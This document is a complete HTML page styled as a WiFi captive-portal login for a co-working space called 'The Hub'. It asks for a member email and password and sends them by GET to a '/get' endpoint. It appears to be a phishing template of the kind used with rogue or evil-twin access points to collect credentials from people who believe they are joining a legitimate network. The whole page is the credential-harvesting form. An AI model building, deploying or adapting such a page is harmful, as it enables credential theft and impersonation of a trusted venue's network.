<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>The Hub — Member WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#f5f5f5;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:420px;background:#fff;border-radius:0;overflow:hidden;box-shadow:0 2px 40px rgba(0,0,0,0.1)}
.accent-bar{height:3px;background:linear-gradient(90deg,#6C63FF,#FF6584,#43E97B)}
.top{padding:32px 32px 24px;border-bottom:1px solid #f0f0f0}
.hub-logo{font-size:13px;font-weight:800;color:#1a1a1a;letter-spacing:3px;text-transform:uppercase;margin-bottom:3px}
.hub-logo span{color:#6C63FF}
.hub-sub{font-size:11px;color:#bbb;letter-spacing:1px}
.ssid-row{display:flex;align-items:center;gap:8px;margin-top:16px;padding:8px 12px;background:#fafafa;border-radius:6px;border:1px solid #f0f0f0}
.dot{width:7px;height:7px;background:#43E97B;border-radius:50%;flex-shrink:0}
.ssid-row span{font-size:11.5px;color:#aaa}
.ssid-row strong{color:#6C63FF;font-weight:600}
.body{padding:28px 32px 24px}
.body h2{font-size:18px;font-weight:700;color:#1a1a1a;margin-bottom:4px}
.body .sub{font-size:13px;color:#bbb;margin-bottom:20px}
.lbl{display:block;font-size:10.5px;font-weight:700;text-transform:uppercase;letter-spacing:1.2px;color:#aaa;margin-bottom:7px;margin-top:18px}
input{width:100%;padding:12px 14px;border:1.5px solid #eee;border-radius:6px;font-size:14.5px;background:#fafafa;color:#1a1a1a}
input:focus{outline:none;border-color:#6C63FF;box-shadow:0 0 0 3px rgba(108,99,255,0.08)}
input::placeholder{color:#ddd}
.btn{width:100%;padding:13px;margin-top:22px;border:none;border-radius:6px;background:#6C63FF;color:#fff;font-size:13px;font-weight:700;letter-spacing:0.3px;cursor:pointer}
.btn:hover{background:#5a52d5}
.terms{font-size:11px;color:#ccc;text-align:center;margin-top:14px;line-height:1.6}
.terms a{color:#6C63FF}
.foot{background:#fafafa;border-top:1px solid #f0f0f0;padding:12px 32px;display:flex;justify-content:space-between}
.foot span,.foot a{font-size:10.5px;color:#ccc;text-decoration:none}
.foot a{color:#6C63FF}
</style>
</head>
<body>
<div class="card">
  <div class="accent-bar"></div>
  <div class="top">
    <div class="hub-logo">The <span>Hub</span></div>
    <div class="hub-sub">Co-working &amp; Creative Space</div>
    <div class="ssid-row"><div class="dot"></div><span>Connected to: <strong>TheHub-Members</strong></span></div>
  </div>
  <div class="body">
    <h2>Member Access</h2>
    <p class="sub">Sign in with your Hub membership to connect.</p>
    <form action="/get">
      <label class="lbl">Member Email</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <button type="submit" class="btn">Connect to Network &rarr;</button>
      <p class="terms">By connecting you agree to our <a href="#">Acceptable Use Policy</a>.</p>
    </form>
  </div>
  <div class="foot"><span>&copy; The Hub Co-working</span><a href="#">Support</a></div>
</div>
</body>
</html>
